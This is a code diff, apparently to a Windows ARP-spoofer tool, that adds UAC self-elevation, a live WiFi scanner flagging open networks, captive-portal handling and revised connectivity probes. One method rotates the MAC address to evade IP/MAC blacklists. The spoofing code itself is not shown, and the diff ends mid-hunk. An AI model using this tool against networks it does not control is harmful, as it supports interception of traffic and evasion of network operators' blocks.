@@ -15,6 +15,9 @@ import json
 import atexit
 import logging
 import warnings
+import ctypes
+import xml.sax.saxutils as xml_escape
+from ctypes import wintypes
 import urllib.request
 import urllib.error
 import urllib.parse
@@ -25,8 +28,20 @@ from colorama import Fore, Style, init
 
 init(autoreset=True)
 conf.verb = 0
+logging.getLogger("scapy").setLevel(logging.ERROR)
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 warnings.filterwarnings("ignore", message=".*Ethernet destination MAC.*")
+warnings.filterwarnings("ignore", message=".*MAC address.*ARP.*")
+warnings.filterwarnings("ignore", category=UserWarning, module="scapy.*")
+
+if os.name == "nt":
+    try:
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+    except (AttributeError, OSError):
+        pass
+
+_session_logger: Optional["SessionLogger"] = None
 
 title = "ARP-SPOOFER - LTX74"
 if os.name == "nt":
@@ -42,14 +57,6 @@ INTERNET_CHECK_TIMEOUT = 5
 INTERNET_CACHE_TTL = 15
 RECOVERY_COOLDOWN = 120
 LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
-
-conf.verb = 0
-logging.getLogger("scapy").setLevel(logging.ERROR)
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-warnings.filterwarnings("ignore", message=".*MAC address.*ARP.*")
-warnings.filterwarnings("ignore", category=UserWarning, module="scapy.*")
-
-_session_logger: Optional["SessionLogger"] = None
 
 
 @dataclass
@@ -80,6 +87,14 @@ def get_gradient_color(step, total_steps):
     return f"\033[38;5;{colors[index]}m"
 
 
+def safe_print(text: str, **kwargs):
+    try:
+        print(text, **kwargs)
+    except UnicodeEncodeError:
+        clean = text.encode("ascii", errors="replace").decode("ascii")
+        print(clean, **kwargs)
+
+
 def print_banner():
     os.system("cls" if os.name == "nt" else "clear")
     lines = [
@@ -91,8 +106,47 @@ def print_banner():
         "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝           ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝",
     ]
     for i, line in enumerate(lines):
-        print(get_gradient_color(i, len(lines)) + line)
-    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}ARP-SPOOFER | By LTX")
+        safe_print(get_gradient_color(i, len(lines)) + line)
+    safe_print(f"\n{Fore.MAGENTA}{Style.BRIGHT}ARP-SPOOFER | By LTX")
+
+
+def normalize_netsh_text(text: str) -> str:
+    return text.replace("\xa0", " ").replace("\u00a0", " ")
+
+
+def parse_netsh_field(text: str, *keys: str) -> str:
+    text = normalize_netsh_text(text)
+    for key in keys:
+        match = re.search(rf"{re.escape(key)}\s*:\s*(.+)", text, re.I)
+        if match:
+            value = match.group(1).strip()
+            if value and value.upper() != "N/A":
+                return value
+    return ""
+
+
+def powershell_value(command: str) -> str:
+    ok, out = run_cmd(f'powershell -NoProfile -Command "{command}"')
+    return out.strip() if ok else ""
+
+
+def setup_scapy_iface():
+    try:
+        if os.name == "nt":
+            alias = powershell_value(
+                "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | "
+                "Sort-Object RouteMetric | Select-Object -First 1).InterfaceAlias"
+            )
+            if alias:
+                for iface in scapy.get_if_list():
+                    if alias.lower() in iface.lower() or iface.lower() in alias.lower():
+                        conf.iface = iface
+                        return
+        route = scapy.conf.route.route("0.0.0.0")
+        if route and len(route) > 3 and route[3]:
+            conf.iface = route[3]
+    except Exception:
+        pass
 
 
 def run_cmd(cmd, timeout=30, encoding=None):
@@ -131,25 +185,25 @@ def extract_wifi_profile_ssid(line: str) -> Optional[str]:
 
 
 def log_info(msg):
-    print(f"{Fore.LIGHTCYAN_EX}[*] {msg}")
+    safe_print(f"{Fore.LIGHTCYAN_EX}[*] {msg}")
     if _session_logger:
         _session_logger.write("INFO", msg)
 
 
 def log_ok(msg):
-    print(f"{Fore.GREEN}[+] {msg}")
+    safe_print(f"{Fore.GREEN}[+] {msg}")
     if _session_logger:
         _session_logger.write("OK", msg)
 
 
 def log_warn(msg):
-    print(f"{Fore.YELLOW}[!] {msg}")
+    safe_print(f"{Fore.YELLOW}[!] {msg}")
     if _session_logger:
         _session_logger.write("WARN", msg)
 
 
 def log_err(msg):
-    print(f"{Fore.RED}[-] {msg}")
+    safe_print(f"{Fore.RED}[-] {msg}")
     if _session_logger:
         _session_logger.write("ERROR", msg)
 
@@ -182,7 +236,47 @@ def check_admin_windows() -> bool:
         return False
 
 
+def request_admin_elevation() -> None:
+    """Trigger the Windows UAC prompt and relaunch with administrator rights."""
+    if os.name != "nt":
+        return
+    if check_admin_windows():
+        return
+    if "--no-elevate" in sys.argv:
+        return
+    if "-h" in sys.argv or "--help" in sys.argv:
+        return
+
+    import ctypes
+
+    safe_print(f"{Fore.YELLOW}[*] Administrator privileges required.")
+    safe_print(f"{Fore.YELLOW}[*] Accept the UAC prompt to continue...")
+
+    script_dir = os.path.dirname(os.path.abspath(sys.argv[0])) or os.getcwd()
+    params = subprocess.list2cmdline(sys.argv)
+
+    ret = ctypes.windll.shell32.ShellExecuteW(
+        None,
+        "runas",
+        sys.executable,
+        params,
+        script_dir,
+        1,
+    )
+
+    if ret <= 32:
+        safe_print(f"{Fore.RED}[-] Elevation failed or was denied by the user (code {ret}).")
+        safe_print(f"{Fore.YELLOW}[!] Right-click your terminal and select 'Run as administrator'.")
+        sys.exit(1)
+
+    sys.exit(0)
+
+
 def export_scan_results(devices: list[dict], output_path: str):
+    try:
+        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or ".", exist_ok=True)
+    except OSError:
+        pass
     ext = os.path.splitext(output_path)[1].lower()
     if ext == ".json":
         payload = {"scanned_at": datetime.now().isoformat(), "devices": devices}
@@ -196,13 +290,381 @@ def export_scan_results(devices: list[dict], output_path: str):
     log_ok(f"Scan exported to {output_path}")
 
 
+def export_wifi_results(networks: list[WifiNetwork], output_path: str):
+    try:
+        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or ".", exist_ok=True)
+    except OSError:
+        pass
+    ext = os.path.splitext(output_path)[1].lower()
+    rows = [
+        {
+            "ssid": n.ssid,
+            "bssid": n.bssid,
+            "signal": n.signal,
+            "auth": n.auth,
+            "open": n.open_network,
+        }
+        for n in networks
+    ]
+    if ext == ".json":
+        payload = {"scanned_at": datetime.now().isoformat(), "networks": rows}
+        with open(output_path, "w", encoding="utf-8") as fh:
+            json.dump(payload, fh, indent=2)
+    else:
+        with open(output_path, "w", encoding="utf-8") as fh:
+            fh.write("ssid,bssid,signal,auth,open\n")
+            for row in rows:
+                fh.write(
+                    f"{row['ssid']},{row['bssid']},{row['signal']},"
+                    f"{row['auth']},{row['open']}\n"
+                )
+    log_ok(f"WiFi scan exported to {output_path}")
+
+# Windows wlanapi ctypes structures (module-level for cross-references)
+class _WLAN_GUID(ctypes.Structure):
+    _fields_ = [
+        ("Data1", wintypes.DWORD),
+        ("Data2", wintypes.WORD),
+        ("Data3", wintypes.WORD),
+        ("Data4", wintypes.BYTE * 8),
+    ]
+
+
+class _DOT11_SSID(ctypes.Structure):
+    _fields_ = [
+        ("SSIDLength", wintypes.ULONG),
+        ("SSID", wintypes.BYTE * 32),
+    ]
+
+
+class _WLAN_RATE_SET(ctypes.Structure):
+    _fields_ = [
+        ("uRateSetLength", wintypes.ULONG),
+        ("usRateSet", wintypes.USHORT * 126),
+    ]
+
+
+class _WLAN_BSS_ENTRY(ctypes.Structure):
+    _fields_ = [
+        ("dot11Ssid", _DOT11_SSID),
+        ("uPhyId", wintypes.ULONG),
+        ("dot11Bssid", wintypes.BYTE * 6),
+        ("dot11BssType", wintypes.DWORD),
+        ("dot11BssPhyType", wintypes.DWORD),
+        ("lRssi", wintypes.LONG),
+        ("uLinkQuality", wintypes.ULONG),
+        ("bInRegDomain", wintypes.BOOL),
+        ("usBeaconPeriod", wintypes.USHORT),
+        ("ullTimestamp", ctypes.c_ulonglong),
+        ("ullHostTimestamp", ctypes.c_ulonglong),
+        ("usCapabilityInformation", wintypes.USHORT),
+        ("ulChCenterFrequency", wintypes.ULONG),
+        ("wlanRateSet", _WLAN_RATE_SET),
+        ("ulIeOffset", wintypes.ULONG),
+        ("ulIeSize", wintypes.ULONG),
+    ]
+
+
+class _WLAN_BSS_LIST(ctypes.Structure):
+    _fields_ = [
+        ("dwTotalSize", wintypes.DWORD),
+        ("dwNumberOfItems", wintypes.DWORD),
+    ]
+
+
+class _WLAN_INTERFACE_INFO(ctypes.Structure):
+    _fields_ = [
+        ("InterfaceGuid", _WLAN_GUID),
+        ("strInterfaceDescription", wintypes.WCHAR * 256),
+        ("isState", wintypes.DWORD),
+    ]
+
+
+class _WLAN_INTERFACE_INFO_LIST(ctypes.Structure):
+    _fields_ = [
+        ("dwNumberOfItems", wintypes.DWORD),
+        ("dwIndex", wintypes.DWORD),
+    ]
+
+
+class _WLAN_AVAILABLE_NETWORK(ctypes.Structure):
+    _fields_ = [
+        ("strProfileName", wintypes.WCHAR * 256),
+        ("dot11Ssid", _DOT11_SSID),
+        ("dot11BssType", wintypes.DWORD),
+        ("uNumberOfBssids", wintypes.ULONG),
+        ("bNetworkConnectable", wintypes.BOOL),
+        ("wlanNotConnectableReason", wintypes.DWORD),
+        ("uNumberOfPhyTypes", wintypes.ULONG),
+        ("dot11PhyTypes", wintypes.DWORD * 8),
+        ("bMorePhyTypes", wintypes.BOOL),
+        ("wlanSignalQuality", wintypes.ULONG),
+        ("bSecurityEnabled", wintypes.BOOL),
+        ("dot11DefaultAuthAlgorithm", wintypes.DWORD),
+        ("dot11DefaultCipherAlgorithm", wintypes.DWORD),
+        ("dwFlags", wintypes.DWORD),
+        ("dwReserved", wintypes.DWORD),
+    ]
+
+
+class _WLAN_AVAILABLE_NETWORK_LIST(ctypes.Structure):
+    _fields_ = [
+        ("dwNumberOfItems", wintypes.DWORD),
+        ("dwIndex", wintypes.DWORD),
+    ]
+
+
+class NativeWifiScanner:
+    """Scan nearby WiFi networks via Windows wlanapi.dll (live radio scan)."""
+
+    WLAN_CLIENT_VERSION = 2
+    ERROR_SUCCESS = 0
+    DOT11_BSS_TYPE_ANY = 3
+
+    GUID = _WLAN_GUID
+    DOT11_SSID = _DOT11_SSID
+    WLAN_RATE_SET = _WLAN_RATE_SET
+    WLAN_BSS_ENTRY = _WLAN_BSS_ENTRY
+    WLAN_BSS_LIST = _WLAN_BSS_LIST
+    WLAN_INTERFACE_INFO = _WLAN_INTERFACE_INFO
+    WLAN_INTERFACE_INFO_LIST = _WLAN_INTERFACE_INFO_LIST
+    WLAN_AVAILABLE_NETWORK = _WLAN_AVAILABLE_NETWORK
+    WLAN_AVAILABLE_NETWORK_LIST = _WLAN_AVAILABLE_NETWORK_LIST
+
+    AUTH_NAMES = {
+        1: "Open",
+        2: "Shared",
+        3: "WPA",
+        4: "WPA-PSK",
+        5: "WPA-None",
+        6: "RSNA",
+        7: "WPA2",
+        8: "WPA2-PSK",
+        9: "WPA3",
+        10: "WPA3-SAE",
+    }
+
+    @classmethod
+    def scan(cls) -> list["WifiNetwork"]:
+        if os.name != "nt":
+            return []
+        try:
+            wlanapi = ctypes.windll.wlanapi
+            cls._configure_wlanapi(wlanapi)
+        except Exception:
+            return []
+
+        client_handle = wintypes.HANDLE()
+        negotiated = wintypes.DWORD()
+        result = wlanapi.WlanOpenHandle(
+            cls.WLAN_CLIENT_VERSION,
+            None,
+            ctypes.byref(negotiated),
+            ctypes.byref(client_handle),
+        )
+        if result != cls.ERROR_SUCCESS:
+            return []
+
+        networks: list[WifiNetwork] = []
+        iface_list_ptr = ctypes.c_void_p()
+        try:
+            result = wlanapi.WlanEnumInterfaces(
+                client_handle, None, ctypes.byref(iface_list_ptr)
+            )
+            if result != cls.ERROR_SUCCESS or not iface_list_ptr.value:
+                return []
+
+            iface_list = ctypes.cast(
+                iface_list_ptr, ctypes.POINTER(cls.WLAN_INTERFACE_INFO_LIST)
+            ).contents
+            iface_base = ctypes.addressof(iface_list) + ctypes.sizeof(
+                cls.WLAN_INTERFACE_INFO_LIST
+            )
+            iface_size = ctypes.sizeof(cls.WLAN_INTERFACE_INFO)
+
+            auth_by_ssid = {}
+            for idx in range(iface_list.dwNumberOfItems):
+                iface = cls.WLAN_INTERFACE_INFO.from_address(
+                    iface_base + idx * iface_size
+                )
+                if iface.isState == 0:
+                    continue
+
+                guid = iface.InterfaceGuid
+                wlanapi.WlanScan(client_handle, ctypes.byref(guid), None, None, None)
+                time.sleep(2)
+
+                auth_by_ssid.update(cls._read_available_networks(wlanapi, client_handle, guid))
+
+                bss_ptr = ctypes.c_void_p()
+                result = wlanapi.WlanGetNetworkBssList(
+                    client_handle,
+                    ctypes.byref(guid),
+                    None,
+                    cls.DOT11_BSS_TYPE_ANY,
+                    0,
+                    None,
+                    ctypes.byref(bss_ptr),
+                )
+                if result != cls.ERROR_SUCCESS or not bss_ptr.value:
+                    continue
+
+                try:
+                    networks.extend(
+                        cls._parse_bss_list(bss_ptr, auth_by_ssid)
+                    )
+                finally:
+                    wlanapi.WlanFreeMemory(bss_ptr)
+        finally:
+            if iface_list_ptr.value:
+                wlanapi.WlanFreeMemory(iface_list_ptr)
+            wlanapi.WlanCloseHandle(client_handle, None)
+
+        return cls._dedupe_networks(networks)
+
+    @classmethod
+    def _configure_wlanapi(cls, wlanapi):
+        wlanapi.WlanOpenHandle.argtypes = [
+            wintypes.DWORD,
+            wintypes.LPVOID,
+            ctypes.POINTER(wintypes.DWORD),
+            ctypes.POINTER(wintypes.HANDLE),
+        ]
+        wlanapi.WlanOpenHandle.restype = wintypes.DWORD
+        wlanapi.WlanCloseHandle.argtypes = [wintypes.HANDLE, wintypes.LPVOID]
+        wlanapi.WlanCloseHandle.restype = wintypes.DWORD
+        wlanapi.WlanFreeMemory.argtypes = [wintypes.LPVOID]
+        wlanapi.WlanFreeMemory.restype = None
+        wlanapi.WlanEnumInterfaces.argtypes = [
+            wintypes.HANDLE,
+            wintypes.LPVOID,
+            ctypes.POINTER(ctypes.c_void_p),
+        ]
+        wlanapi.WlanEnumInterfaces.restype = wintypes.DWORD
+        wlanapi.WlanScan.argtypes = [
+            wintypes.HANDLE,
+            ctypes.POINTER(_WLAN_GUID),
+            wintypes.LPVOID,
+            wintypes.LPVOID,
+            wintypes.LPVOID,
+        ]
+        wlanapi.WlanScan.restype = wintypes.DWORD
+        wlanapi.WlanGetNetworkBssList.argtypes = [
+            wintypes.HANDLE,
+            ctypes.POINTER(_WLAN_GUID),
+            wintypes.LPVOID,
+            wintypes.DWORD,
+            wintypes.DWORD,
+            wintypes.LPVOID,
+            ctypes.POINTER(ctypes.c_void_p),
+        ]
+        wlanapi.WlanGetNetworkBssList.restype = wintypes.DWORD
+        wlanapi.WlanGetAvailableNetworkList.argtypes = [
+            wintypes.HANDLE,
+            ctypes.POINTER(_WLAN_GUID),
+            wintypes.DWORD,
+            wintypes.LPVOID,
+            ctypes.POINTER(ctypes.c_void_p),
+        ]
+        wlanapi.WlanGetAvailableNetworkList.restype = wintypes.DWORD
+
+    @staticmethod
+    def _dedupe_networks(networks: list["WifiNetwork"]) -> list["WifiNetwork"]:
+        seen = set()
+        unique = []
+        for net in networks:
+            key = (net.ssid, net.bssid)
+            if key not in seen:
+                seen.add(key)
+                unique.append(net)
+        return unique
+
+    @classmethod
+    def _read_available_networks(cls, wlanapi, client_handle, guid) -> dict[str, str]:
+        auth_map: dict[str, str] = {}
+        avail_ptr = ctypes.c_void_p()
+        result = wlanapi.WlanGetAvailableNetworkList(
+            client_handle,
+            ctypes.byref(guid),
+            0,
+            None,
+            ctypes.byref(avail_ptr),
+        )
+        if result != cls.ERROR_SUCCESS or not avail_ptr.value:
+            return auth_map
+
+        try:
+            avail_list = ctypes.cast(
+                avail_ptr, ctypes.POINTER(cls.WLAN_AVAILABLE_NETWORK_LIST)
+            ).contents
+            base = ctypes.addressof(avail_list) + ctypes.sizeof(
+                cls.WLAN_AVAILABLE_NETWORK_LIST
+            )
+            entry_size = ctypes.sizeof(cls.WLAN_AVAILABLE_NETWORK)
+            for idx in range(avail_list.dwNumberOfItems):
+                entry = cls.WLAN_AVAILABLE_NETWORK.from_address(
+                    base + idx * entry_size
+                )
+                ssid = cls._decode_ssid(entry.dot11Ssid)
+                if not ssid:
+                    continue
+                if not entry.bSecurityEnabled:
+                    auth_map[ssid] = "Open"
+                else:
+                    auth_map[ssid] = cls.AUTH_NAMES.get(
+                        entry.dot11DefaultAuthAlgorithm, "Secured"
+                    )
+        finally:
+            wlanapi.WlanFreeMemory(avail_ptr)
+        return auth_map
+
+    @classmethod
+    def _parse_bss_list(cls, bss_ptr, auth_by_ssid: dict[str, str]) -> list["WifiNetwork"]:
+        results: list[WifiNetwork] = []
+        bss_list = ctypes.cast(bss_ptr, ctypes.POINTER(cls.WLAN_BSS_LIST)).contents
+        base = ctypes.addressof(bss_list) + ctypes.sizeof(cls.WLAN_BSS_LIST)
+        entry_size = ctypes.sizeof(cls.WLAN_BSS_ENTRY)
+
+        for idx in range(bss_list.dwNumberOfItems):
+            entry = cls.WLAN_BSS_ENTRY.from_address(base + idx * entry_size)
+            ssid = cls._decode_ssid(entry.dot11Ssid)
+            if not ssid:
+                continue
+            bssid = ":".join(f"{entry.dot11Bssid[i]:02x}" for i in range(6))
+            signal = int(entry.uLinkQuality)
+            auth = auth_by_ssid.get(ssid, "Open")
+            if auth == "Open" and (entry.usCapabilityInformation & 0x0010):
+                auth = "Secured"
+            results.append(
+                WifiNetwork(
+                    ssid=ssid,
+                    bssid=bssid,
+                    signal=signal,
+                    auth=auth,
+                    open_network=auth.lower() == "open",
+                )
+            )
+        return results
+
+    @staticmethod
+    def _decode_ssid(dot11_ssid) -> str:
+        length = int(dot11_ssid.SSIDLength)
+        if length <= 0:
+            return ""
+        raw = bytes(dot11_ssid.SSID[:length])
+        try:
+            return raw.decode("utf-8")
+        except UnicodeDecodeError:
+            return raw.decode("latin-1", errors="replace")
+
+
 class NetworkResilience:
     """Windows-focused network detection, recovery and WiFi management."""
 
     CAPTIVE_KEYWORDS = (
-        "accept", "accepter", "agree", "connect", "connexion", "login",
-        "valider", "continuer", "continue", "terms", "conditions", "submit",
-        "j'accepte", "autoriser", "authorize", "get online", "click to",
+        "accept", "agree", "connect", "login", "continue", "terms", "conditions",
+        "submit", "authorize", "authorization", "get online", "click to", "consent",
+        "i agree", "free wifi", "get connected", "portal", "hotspot",
     )
 
     def __init__(self, initial_ctx: NetworkContext):
@@ -233,15 +695,15 @@ class NetworkResilience:
                         self.initial_ctx.interface_name = iface.strip()
                         break
         else:
-            ssid = self._parse_value(out, "SSID")
-            if not ssid or ssid == "N/A":
+            ssid = parse_netsh_field(out, "SSID")
+            if not ssid:
                 return
             self.initial_ctx.is_wifi = True
             self.initial_ctx.ssid = ssid
-            self.initial_ctx.interface_name = self._parse_value(out, "Name") or ""
-            self.initial_ctx.wifi_auth = self._parse_value(out, "Authentication") or ""
-            if not self.initial_ctx.wifi_auth:
-                self.initial_ctx.wifi_auth = self._parse_value(out, "Authentification") or ""
+            self.initial_ctx.interface_name = parse_netsh_field(out, "Name", "Nom") or ""
+            self.initial_ctx.wifi_auth = parse_netsh_field(
+                out, "Authentication", "Authentification"
+            )
 
         if not self.initial_ctx.ssid:
             return
@@ -275,18 +737,6 @@ class NetworkResilience:
         return result
 
     def _probe_internet(self) -> bool:
-        probes = [
-            ("8.8.8.8", 53),
-            ("1.1.1.1", 53),
-            ("208.67.222.222", 53),
-        ]
-        for host, port in probes:
-            try:
-                with socket.create_connection((host, port), timeout=INTERNET_CHECK_TIMEOUT):
-                    return True
-            except OSError:
-                continue
-
         urls = [
             "http://connectivitycheck.gstatic.com/generate_204",
             "http://www.msftconnecttest.com/connecttest.txt",
@@ -296,14 +746,24 @@ class NetworkResilience:
             try:
                 req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                 with urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT) as resp:
-                    if resp.status in (200, 204):
+                    if resp.status == 204:
+                        return True
+                    if resp.status == 200:
                         body = resp.read(512).decode("utf-8", errors="ignore").lower()
-                        if "success" in body or "microsoft connect test" in body or resp.status == 204:
+                        if "success" in body or "microsoft connect test" in body:
                             return True
             except urllib.error.HTTPError as exc:
                 if exc.code in (200, 204):
                     return True
             except Exception:
+                continue
+
+        probes = [("1.1.1.1", 443), ("8.8.8.8", 443), ("1.1.1.1", 53)]
+        for host, port in probes:
+            try:
+                with socket.create_connection((host, port), timeout=INTERNET_CHECK_TIMEOUT):
+                    return True
+            except OSError:
                 continue
         return False
 
@@ -372,7 +832,7 @@ class NetworkResilience:
         self._last_recovery = time.time()
         self._recovery_count += 1
         try:
-            log_warn("Internet lost — starting recovery sequence...")
+            log_warn("Internet lost - starting recovery sequence...")
             methods = [
                 self._method_dhcp_renew,
                 self._method_change_local_ip,
@@ -388,8 +848,11 @@ class NetworkResilience:
                         self.refresh_context()
                         if self.needs_captive_portal():
                             self.handle_captive_portal()
-                        if self.has_internet():
+                        if self.has_internet(use_cache=False):
                             log_ok(f"Connectivity restored via {method.__name__}.")
+                            return True
+                        if self._local_network_ok():
+                            log_ok(f"Local network restored via {method.__name__}.")
                             return True
                 except Exception as exc:
                     log_warn(f"{method.__name__} failed: {exc}")
@@ -400,11 +863,13 @@ class NetworkResilience:
             self._recovery_in_progress = False
             self._internet_cache = (False, 0.0)
 
-    def display_wifi_scan(self):
+    def display_wifi_scan(self) -> list[WifiNetwork]:
+        log_info("Scanning nearby WiFi networks (live radio scan)...")
         networks = self.scan_wifi_networks()
         if not networks:
-            log_warn("No WiFi networks detected.")
-            return
+            log_warn("No nearby WiFi networks detected.")
+            log_warn("Run as Administrator and ensure your WiFi adapter is enabled.")
+            return []
         seen = set()
         unique = []
         for n in networks:
@@ -414,28 +879,78 @@ class NetworkResilience:
                 unique.append(n)
         unique.sort(key=lambda n: n.signal, reverse=True)
 
-        print(f"\n{Fore.WHITE}┌{'─' * 22}┬{'─' * 20}┬{'─' * 10}┬{'─' * 28}┐")
-        print(f"{Fore.WHITE}│ {'SSID':<20} │ {'BSSID':<18} │ {'Signal':<8} │ {'Auth':<26} │")
-        print(f"{Fore.WHITE}├{'─' * 22}┼{'─' * 20}┼{'─' * 10}┼{'─' * 28}┤")
+        safe_print(f"\n{Fore.WHITE}+{'-' * 22}+{'-' * 20}+{'-' * 10}+{'-' * 28}+")
+        safe_print(f"{Fore.WHITE}| {'SSID':<20} | {'BSSID':<18} | {'Signal':<8} | {'Auth':<26} |")
+        safe_print(f"{Fore.WHITE}+{'-' * 22}+{'-' * 20}+{'-' * 10}+{'-' * 28}+")
         for n in unique:
             auth = n.auth[:26]
             sig = f"{n.signal}%" if n.signal else "N/A"
-            if n.open_network:
-                open_tag = f"{Fore.GREEN}OPEN"
-            elif n.bssid == "(connecte)":
-                open_tag = f"{Fore.CYAN}ACTIF"
-            elif n.bssid == "(profil sauvegarde)":
-                open_tag = f"{Fore.YELLOW}SAUVE"
-            else:
-                open_tag = f"{Fore.YELLOW}SECURED"
-            print(
-                f"{Fore.WHITE}│ {Fore.CYAN}{n.ssid[:20]:<20} {Fore.WHITE}│ "
-                f"{Fore.LIGHTBLACK_EX}{n.bssid[:18]:<18} {Fore.WHITE}│ "
-                f"{Fore.GREEN}{sig:<8} {Fore.WHITE}│ "
-                f"{open_tag} {auth[:18]:<18} {Fore.WHITE}│"
+            open_tag = f"{Fore.GREEN}OPEN" if n.open_network else f"{Fore.YELLOW}SECURED"
+            safe_print(
+                f"{Fore.WHITE}| {Fore.CYAN}{n.ssid[:20]:<20} {Fore.WHITE}| "
+                f"{Fore.LIGHTBLACK_EX}{n.bssid[:18]:<18} {Fore.WHITE}| "
+                f"{Fore.GREEN}{sig:<8} {Fore.WHITE}| "
+                f"{open_tag} {auth[:18]:<18} {Fore.WHITE}|"
             )
-        print(f"{Fore.WHITE}└{'─' * 22}┴{'─' * 20}┴{'─' * 10}┴{'─' * 28}┘")
-        log_ok(f"WiFi scan: {len(unique)} network(s) found.")
+        safe_print(f"{Fore.WHITE}+{'-' * 22}+{'-' * 20}+{'-' * 10}+{'-' * 28}+")
+        log_ok(f"Nearby WiFi scan: {len(unique)} network(s) found.")
+        return unique
+
+    def scan_wifi_networks(self) -> list[WifiNetwork]:
+        """Scan nearby WiFi networks using the Windows WLAN API (live scan)."""
+        if os.name != "nt":
+            return []
+
+        networks = NativeWifiScanner.scan()
+        if networks:
+            return networks
+
+        iface = self._get_wifi_interface_name()
+        if iface:
+            _, out = run_netsh(f'netsh wlan show networks mode=bssid interface="{iface}"')
+        else:
+            _, out = run_netsh("netsh wlan show networks mode=bssid")
+
+        if out.strip() and not self._is_location_blocked(out):
+            networks = self._parse_wifi_scan(out)
+            if networks:
+                return networks
+
+        if not out.strip() or self._is_location_blocked(out):
+            self._warn_location_required()
+
+        return []
+
+    def _is_location_blocked(self, text: str) -> bool:
+        if not text:
+            return False
+        markers = (
+            "location permission",
+            "location services",
+            "wlanqueryinterface",
+            "network commands need location",
+            "desktop apps access your location",
+            "location access",
+        )
+        low = text.lower()
+        if any(m in low for m in markers):
+            return True
+        return "location" in low and ("permission" in low or "services" in low or "access" in low)
+
+    def _warn_location_required(self):
+        log_warn("Live WiFi scan returned no results.")
+        log_warn(
+            "If needed, enable: Settings > Privacy > Location > "
+            "'Let desktop apps access your location'"
+        )
+
+    def _get_wifi_interface_name(self) -> str:
+        ok, out = run_netsh("netsh wlan show interfaces")
+        if ok and out.strip():
+            name = parse_netsh_field(out, "Name", "Nom")
+            if name:
+                return name
+        return self.ctx.interface_name or self._get_active_interface()
 
     def _method_randomize_mac(self) -> bool:
         """Rotate adapter MAC to evade IP/MAC blacklists (Windows)."""
@@ -464,127 +979,6 @@ class NetworkResilience:
             self._method_dhcp_renew()
             return self.has_internet(use_cache=False)
         return False
-
-    def scan_wifi_networks(self) -> list[WifiNetwork]:
-        if os.name != "nt":
-            return []
-
-        iface = self._get_wifi_interface_name()
-        if iface:
-            _, out = run_netsh(f'netsh wlan show networks mode=bssid interface="{iface}"')
-        else:
-            _, out = run_netsh("netsh wlan show networks mode=bssid")
-
-        if self._is_location_blocked(out):
-            self._warn_location_required()
-            return self._scan_wifi_fallback()
-
-        networks = self._parse_wifi_scan(out)
-        if not networks:
-            _, out2 = run_netsh("netsh wlan show networks")
-            if not self._is_location_blocked(out2):
-                networks = self._parse_wifi_scan(out2)
-
-        return networks if networks else self._scan_wifi_fallback()
-
-    def _is_location_blocked(self, text: str) -> bool:
-        if not text:
-            return True
-        markers = (
-            "autorisation de localisation",
-            "services de localisation",
-            "location permission",
-            "location services",
-            "privacy-location",
-            "ms-settings:privacy-location",
-            "wlanqueryinterface",
-            "nécessitent une autorisation",
-            "necessitent une autorisation",
-            "interpréteur de commandes réseau",
-            "network commands need location",
-        )
-        low = text.lower()
-        return any(m in low for m in markers)
-
-    def _warn_location_required(self):
-        log_warn("Windows bloque le scan WiFi live sans la Localisation activee.")
-        log_warn("Parametres > Confidentialite et securite > Localisation > ACTIVER")
-        log_warn("Cochez aussi : 'Autoriser les applications de bureau a acceder a votre position'")
-        log_info("Affichage des profils WiFi sauvegardes en attendant...")
-        run_cmd("start ms-settings:privacy-location")
-
-    def _get_wifi_interface_name(self) -> str:
-        _, out = run_netsh("netsh wlan show profiles")
-        match = re.search(r"interface\s+(.+?)\s*:", out, re.I)
-        if match:
-            return match.group(1).strip()
-        ok, out = run_cmd(
-            'powershell -NoProfile -Command '
-            '"(Get-NetConnectionProfile | Select-Object -First 1).InterfaceAlias"'
-        )
-        if ok and out.strip():
-            return out.strip()
-        return self.ctx.interface_name or self._get_active_interface()
-
-    def _scan_wifi_fallback(self) -> list[WifiNetwork]:
-        """Fallback when Windows blocks live scan (location off). Uses saved profiles + current connection."""
-        networks: list[WifiNetwork] = []
-        seen: set[str] = set()
-
-        ok, out = run_cmd(
-            'powershell -NoProfile -Command '
-            '"Get-NetConnectionProfile | ForEach-Object { $_.Name + \'|\' + $_.InterfaceAlias }"'
-        )
-        if ok:
-            for line in out.splitlines():
-                if "|" not in line:
-                    continue
-                ssid, iface = line.split("|", 1)
-                ssid = ssid.strip()
-                if ssid and ssid not in seen:
-                    seen.add(ssid)
-                    networks.append(
-                        WifiNetwork(
-                            ssid=ssid,
-                            bssid="(connecte)",
-                            signal=100,
-                            auth="Reseau actuel",
-                            open_network=False,
-                        )
-                    )
-
-        ok, out = run_netsh("netsh wlan show profiles")
-        if ok or out.strip():
-            for line in out.splitlines():
-                ssid = extract_wifi_profile_ssid(line)
-                if ssid and ssid not in seen:
-                    seen.add(ssid)
-                    auth = "Profil enregistre"
-                    ok2, profile_out = run_netsh(f'netsh wlan show profile name="{ssid}"')
-                    if ok2:
-                        auth_val = self._parse_value(profile_out, "Authentification")
-                        if not auth_val:
-                            auth_val = self._parse_value(profile_out, "Authentication")
-                        if auth_val:
-                            auth = auth_val
-                    networks.append(
-                        WifiNetwork(
-                            ssid=ssid,
-                            bssid="(profil sauvegarde)",
-                            signal=0,
-                            auth=auth,
-                            open_network="ouvert" in auth.lower() or "open" in auth.lower(),
-                        )
-                    )
-
-        if networks:
-            log_info(
-                "Scan WiFi limite — profils sauvegardes + reseau actuel affiches."
-            )
-            log_info(
-                "Pour voir TOUS les reseaux a proximite, activez la Localisation Windows."
-            )
-        return networks
 
     def _method_dhcp_renew(self) -> bool:
         iface = self.ctx.interface_name or self._get_active_interface()
@@ -673,8 +1067,8 @@ class NetworkResilience:
         initial_ssid = self.initial_ctx.ssid.lower()
         initial_bssid_prefix = ""
         if self.initial_ctx.is_wifi:
-            ok, out = run_cmd("netsh wlan show interfaces")
